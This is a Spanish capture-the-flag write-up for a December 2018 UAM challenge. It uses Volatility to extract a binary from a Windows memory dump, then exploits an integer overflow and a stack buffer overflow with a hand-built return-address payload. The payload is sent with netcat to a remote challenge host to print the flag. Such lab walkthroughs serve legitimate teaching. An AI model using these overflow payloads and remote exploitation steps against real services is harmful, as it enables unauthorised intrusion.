@@ -1,0 +1,220 @@
+UNA AL MES (Diciembre 2018)
+**************************************************************************
+
+Categoría: Universo Marvel
+Episodio: 1 - 2ª Parte
+
+--------------------------------------------------------------------------
+
+1. Descargamos el fichero adjunto de https://drive.google.com/open?id=1Hbo8lqq9QPAJGNCRM4aE5jHcZhILuGTN
+
+2. Una vez descargado, lo descomprimimos:
+
+oreos# unzip image.zip
+
+Obtenemos un fichero image.raw con un dump.
+
+3. Lanzamos volatility para averiguar el tipo de sistema operativo.
+
+oreos# volatility -f image.raw imageinfo
+Volatility Foundation Volatility Framework 2.6
+INFO    : volatility.debug    : Determining profile based on KDBG search...
+          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
+                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
+                     AS Layer2 : FileAddressSpace (/root/uam/marvell/ep2/image.raw)
+                      PAE type : No PAE
+                           DTB : 0x187000L
+                          KDBG : 0xf80002c08070L
+          Number of Processors : 1
+     Image Type (Service Pack) : 0
+                KPCR for CPU 0 : 0xfffff80002c09d00L
+             KUSER_SHARED_DATA : 0xfffff78000000000L
+           Image date and time : 2018-12-20 15:48:02 UTC+0000
+     Image local date and time : 2018-12-20 16:48:02 +0100
+
+El perfil de sistema operativo a usar es Win7SP1x64.
+
+4. Listamos los ficheros para el usuario 'admin'
+
+oreos# volatility -f image.raw --profile=Win7SP1x64 filescan | grep "admin"
+
+Observamos algunos ficheros interesantes en el escritorio:
+ 1 - flag.txt
+ 2 - HydralarioHydra
+ 3 - netcat... 
+
+Hacemos un dump de los ficheros 1) y 2):
+
+oreos# volatility -f image.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000013dfcb730 -D .
+oreos# volatility -f image.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000013d563f20 -D .
+
+Cambiamos el nombre a los ficheros:
+
+oreos# mv file.None.0xfffffa80066d6d00.dat flag.txt
+oreos# mv file.None.0xfffffa80089e01c0.dat HydralarioHydra
+
+Los ficheros son:
+ - flag.txt: ASCII text, with no line terminators
+ - HydralarioHydra: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c03cee4c7f44b1055031fd53980bd22e47873ab1, not stripped
+
+
+5. Tras analizar el binario y el fichero flag.txt, observamos lo siguiente:
+
+a. La función read_flag lee el contenido de flag.txt y lo almacena en una variable "flag" en la posición de memoria 0x084160A0
+
+int read_flag()
+{
+  int v1; // [esp+0h] [ebp-18h]
+  char *src; // [esp+4h] [ebp-14h]
+  int v3; // [esp+8h] [ebp-10h]
+  FILE *stream; // [esp+Ch] [ebp-Ch]
+
+  src = 0;
+  v1 = 0;
+  stream = fopen("flag.txt", "r");
+  if ( !stream )
+  {
+    printf("\nError leyendo fichero flag.txt");
+    exit(1);
+  }
+  v3 = getline(&src, &v1, stream);
+  if ( v3 == -1 )
+    exit(1);
+  strcpy(flag, src);
+  return fclose(stream);
+}
+
+.bss:084160A0 flag            db 0C0h dup(?)          ; DATA XREF: read_flag+8E↑o
+
+b. La función check_age comprueba el primer valor introducido por el usuario. Deberemos introducir el valor 0 para que la función devuelva el valor 1 (comparación final). Para conseguir un valor 0 que esté comprendido entre 9 <= <valor> < 99999, deberemos provocar un desbordamiento. Para ello, insertaremos el valor 65536, el cual desbordará e insertará un valor 0 (tipo de v2 == int16 == 2^16bits == 65535.
+
+_BOOL4 check_age()
+{
+  int v1; // [esp+8h] [ebp-10h]
+  __int16 v2; // [esp+Eh] [ebp-Ah]
+
+  __isoc99_scanf((const char *)&unk_84144D0, &v1);
+  if ( v1 > 99999 || v1 <= 9 )
+    return 0;
+  v2 = v1;
+  printf("\nEdad: %d", (unsigned __int16)v1);
+  return v2 == 0;
+}
+
+Insertando el valor 65536 conseguimos saltar la primera prueba:
+
+oreos# python -c 'print("65536\n")' | ./HydralarioHydra
+
+
+Bienvenido al sistema de reclutamiento de agentes.
+¡Veamos si tienes lo que hay que tener para ser parte de Hydra!
+
+Edad: 0
+Parece que tienes madera de agente... hagamos una ultima comprobacion...
+Cuentame el secreto y yo te contare el mio: 
+
+c. La función tell_me_a_secret lee un valor de entrada. En este caso, aprovecharemos un buffer overflow.
+
+int tell_me_a_secret()
+{
+  char v1; // [esp+8h] [ebp-10h]
+
+  printf("\nCuentame el secreto y yo te contare el mio: ");
+  return __isoc99_scanf("%s", &v1);
+}
+
+python -c 'print("65536\n" + "A"*20 + "ABCD")' | strace ./HydralarioHydra
+
+--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x44434241} ---
+
+Observamos el buffer overflow para un buffer de 20 caractéres. Por lo tanto, aprovecharemos para introducir en el stack la llamada a la función que nos permita imprimir la flag. La función oculta "a", nos permite imprimir un valor pasado por parámetro. Invocaremos la llamada a dicha función, e insertaremos por parámetro el valor de la variable flag del paso a).
+
+int __cdecl a(char *format)
+{
+  puts("\nBuen trabajo!");
+  printf(format);
+  return printf("\nAgente!");
+}
+
+oreos# readelf -a HydralarioHydra  | grep FUNC
+     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND getline@GLIBC_2.0 (2)
+     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.0 (2)
+     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND fclose@GLIBC_2.1 (3)
+     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND strcpy@GLIBC_2.0 (2)
+     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.0 (2)
+     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.0 (2)
+     8: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
+     9: 00000000     0 FUNC    GLOBAL DEFAULT  UND fopen@GLIBC_2.1 (3)
+    10: 00000000     0 FUNC    GLOBAL DEFAULT  UND __isoc99_scanf@GLIBC_2.7 (4)
+    28: 08414160     0 FUNC    LOCAL  DEFAULT    1 deregister_tm_clones
+    29: 084141a0     0 FUNC    LOCAL  DEFAULT    1 register_tm_clones
+    30: 084141e0     0 FUNC    LOCAL  DEFAULT    1 __do_global_dtors_aux
+    33: 08414210     0 FUNC    LOCAL  DEFAULT    1 frame_dummy
+    44: 084144b0     2 FUNC    GLOBAL DEFAULT    1 __libc_csu_fini
+    45: 00000000     0 FUNC    GLOBAL DEFAULT  UND getline@@GLIBC_2.0
+    46: 08414150     4 FUNC    GLOBAL HIDDEN     1 __x86.get_pc_thunk.bx
+    48: 00000000     0 FUNC    GLOBAL DEFAULT  UND printf@@GLIBC_2.0
+    49: 0841428d    64 FUNC    GLOBAL DEFAULT    1 tell_me_a_secret
+    51: 00000000     0 FUNC    GLOBAL DEFAULT  UND fclose@@GLIBC_2.1
+    52: 084144b4     0 FUNC    GLOBAL DEFAULT   15 _fini
+    54: 00000000     0 FUNC    GLOBAL DEFAULT  UND strcpy@@GLIBC_2.0
+    56: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.0
+    58: 00000000     0 FUNC    GLOBAL DEFAULT  UND exit@@GLIBC_2.0
+    61: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
+    62: 08414450    93 FUNC    GLOBAL DEFAULT    1 __libc_csu_init
+    63: 00000000     0 FUNC    GLOBAL DEFAULT  UND fopen@@GLIBC_2.1
+    64: 08414216   119 FUNC    GLOBAL DEFAULT    1 check_age
+    66: 08414140     2 FUNC    GLOBAL HIDDEN     1 _dl_relocate_static_pie
+    67: 08414100     0 FUNC    GLOBAL DEFAULT    1 _start
+    69: 084142cd    74 FUNC    GLOBAL DEFAULT    1 a
+    71: 084143c8   129 FUNC    GLOBAL DEFAULT    1 main
+    72: 00000000     0 FUNC    GLOBAL DEFAULT  UND __isoc99_scanf@@GLIBC_2.7
+    75: 080483ec     0 FUNC    GLOBAL DEFAULT   12 _init
+    76: 08414317   177 FUNC    GLOBAL DEFAULT    1 read_flag
+
+La función "a" se encuentra en la dirección 0x084142cd. Nuestro payload quedará de la siguiente forma:
+
+"\xCD\x42\x41\x08" + "\x00\x00\x00\x00" + "\xA0\x60\x41\x08", cuyo llamada completa sería:
+
+python -c 'print("65536\n" + "A"*20 + "\xCD\x42\x41\x08" + "\x00\x00\x00\x00" + "\xA0\x60\x41\x08")' | ./HydralarioHydra
+
+Bienvenido al sistema de reclutamiento de agentes.
+¡Veamos si tienes lo que hay que tener para ser parte de Hydra!
+
+Edad: 0
+Parece que tienes madera de agente... hagamos una ultima comprobacion...
+Cuentame el secreto y yo te contare el mio: 
+Buen trabajo!
+UAM{EstaNoEsLaFlag}
+Violación de segmento
+
+El contenido del fichero flag.txt se imprime.
+
+6. Una vez resuelto en local, localizaremos el servicio remoto donde realizaremos el exploiting para obtener la flag. Para ello, volvemos a usar volatility nuevamente:
+
+oreos# volatility -f image.raw --profile=Win7SP1x64 netscan
+
+....
+0x13d880880        TCPv4    172.16.233.139:49166           34.247.69.86:9009    ESTABLISHED      1940     nc64.exe 
+....
+
+El servicio donde está corriendo la aplicación es 34.247.69.86:9009. Usaremos netcat para explotar el servicio.
+
+7. Explotamos el servicio con el siguiente comando:
+
+oreos# python -c 'print("65536\n" + "A"*20 + "\xCD\x42\x41\x08" + "\x00\x00\x00\x00" + "\xA0\x60\x41\x08")' | nc 34.247.69.86 9009
+65536
+AAAAAAAAAAAAAAAAAAAA�BA^H^@^@^@^@�`A^H
+
+Bienvenido al sistema de reclutamiento de agentes.
+¡Veamos si tienes lo que hay que tener para ser parte de Hydra!
+
+Edad: 0
+Parece que tienes madera de agente... hagamos una ultima comprobacion...
+Cuentame el secreto y yo te contare el mio: 
+Buen trabajo!
+UAM{f2d593fa4eb0cd1860ed80fb0f7236ca}
+
+8. Obtenemos la flag:
+
+UAM{f2d593fa4eb0cd1860ed80fb0f7236ca}
